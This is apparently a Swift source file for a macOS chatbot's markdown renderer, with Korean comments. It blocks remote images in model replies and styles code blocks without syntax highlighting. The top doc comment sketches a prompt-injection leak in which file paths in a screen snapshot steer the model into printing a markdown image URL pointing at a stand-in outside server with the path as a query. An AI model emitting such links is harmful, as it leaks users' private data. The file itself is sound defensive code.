import AppKit
import MarkdownView
import SwiftUI

/// 모델 답변에 실린 원격 이미지를 가져오지 않고 주소만 보여 준다.
///
/// 화면 스냅샷에는 사용자 파일 이름과 경로가 들어간다. 그 문자열이 모델을 유도해
/// `![](https://남의서버/?p=/Users/...)` 같은 이미지를 출력시키면, 답변이 그려지는 순간
/// 앱이 그 URL을 요청하면서 경로가 밖으로 나간다. 사용자가 아무것도 누르지 않아도
/// 새는 경로이므로 http·https 이미지는 렌더러를 가로채 요청 자체를 만들지 않는다.
///
/// 상대 경로·`file://` 이미지는 `preferredBaseURL`을 설정하지 않는 한 라이브러리가
/// 평문으로 떨어뜨리므로 따로 막을 것이 없다.
struct BlockedRemoteImageRenderer: MarkdownImageRenderer {
    func makeBody(configuration: Configuration) -> some View {
        HStack(alignment: .top, spacing: 6) {
            Image(systemName: "eye.slash")
                .foregroundStyle(.secondary)
            VStack(alignment: .leading, spacing: 1) {
                Text(configuration.alternativeText ?? "원격 이미지를 불러오지 않았습니다")
                    .font(.caption)
                Text(configuration.url.absoluteString)
                    .font(.caption2)
                    .foregroundStyle(.secondary)
                    .lineLimit(2)
                    .truncationMode(.middle)
            }
        }
        .padding(6)
        .frame(maxWidth: .infinity, alignment: .leading)
        .overlay {
            RoundedRectangle(cornerRadius: 4)
                .strokeBorder(Color.secondary.opacity(0.3))
        }
    }
}

/// 코드 블록. 언어 라벨과 복사 버튼을 달고 본문은 모노스페이스로 그린다.
///
/// **구문 강조를 쓰지 않는 것은 배포 제약 때문이다. 이 스타일을 라이브러리 기본값으로
/// 되돌리면 다른 사람 컴퓨터에서 앱이 죽는다.** 기본 스타일은 Highlightr를 쓰고,
/// Highlightr는 `Bundle.module`로 highlight.js를 찾는다. SPM이 만든 그 접근자는
/// `.app` 루트에서 리소스 번들을 찾고 실패하면 **빌드한 머신의 `.build` 절대경로**로
/// 폴백한 뒤, 그것도 없으면 `fatalError`를 낸다. 그런데 `.app` 루트에 파일을 두면
/// `codesign`이 "unsealed contents present in the bundle root"로 서명을 거부한다(실측).
/// 즉 번들을 넣으면 서명이 깨지고, 넣지 않으면 개발 머신에서만 동작한다.
/// 그래서 Highlightr를 아예 호출하지 않는 길을 택했다.
///
/// 같은 이유로 `markdownMathRenderingEnabled()`도 부르지 않는다. 수식 렌더는
/// SwiftMath의 `Bundle.module`에서 폰트를 찾으므로 똑같이 죽는다. 라이브러리 기본값이
/// 비활성이라 부르지 않는 것으로 충분하다.
///
/// 구문 강조가 정말 필요하면 Xcode 프로젝트로 전환해야 한다. Xcode가 생성하는
/// 리소스 접근자는 `Contents/Resources`도 탐색하므로 서명과 공존한다.
struct ChatCodeBlockStyle: MarkdownCodeBlockStyle {
    func makeBody(configuration: Configuration) -> some View {
        VStack(alignment: .leading, spacing: 0) {
            HStack(spacing: 4) {
                Text(configuration.language ?? "코드")
                    .font(.caption2)
                    .foregroundStyle(.secondary)
                Spacer()
                CopyCodeButton(code: configuration.code)
            }
            .padding(.horizontal, 8)
            .padding(.top, 4)

            Text(configuration.code)
                .font(.system(.caption, design: .monospaced))
                .textSelection(.enabled)
                .frame(maxWidth: .infinity, alignment: .leading)
                .padding(8)
        }
        .background(Color.secondary.opacity(0.12), in: RoundedRectangle(cornerRadius: 6))
    }
}

/// 코드 블록을 클립보드로 옮긴다. 좁은 패널에서 긴 명령을 손으로 고르는 것보다 확실하다.
private struct CopyCodeButton: View {
    let code: String

    @State private var hasCopied = false

    var body: some View {
        Button(hasCopied ? "복사됨" : "복사") {
            NSPasteboard.general.clearContents()
            NSPasteboard.general.setString(code, forType: .string)
            hasCopied = true
        }
        .buttonStyle(.link)
        .font(.caption2)
        // 눌린 표시는 잠깐만 남긴다. 그대로 두면 다음에 눌러도 바뀐 게 없어 보인다.
        .task(id: hasCopied) {
            guard hasCopied else { return }
            try? await Task.sleep(for: .seconds(1.5))
            hasCopied = false
        }
    }
}

extension View {
    /// 챗봇 답변 마크다운의 공통 설정.
    ///
    /// 원격 이미지 차단과 코드 블록 스타일은 취향이 아니라 전제다. 각각의 이유는
    /// `BlockedRemoteImageRenderer`와 `ChatCodeBlockStyle`의 주석에 적어 두었다.
    func chatMarkdownStyle() -> some View {
        markdownElementRenderer(.image(BlockedRemoteImageRenderer(), urlScheme: "https"))
            .markdownElementRenderer(.image(BlockedRemoteImageRenderer(), urlScheme: "http"))
            .markdownCodeBlockStyle(ChatCodeBlockStyle())
            .markdownComponentSpacing(6)
    }
}
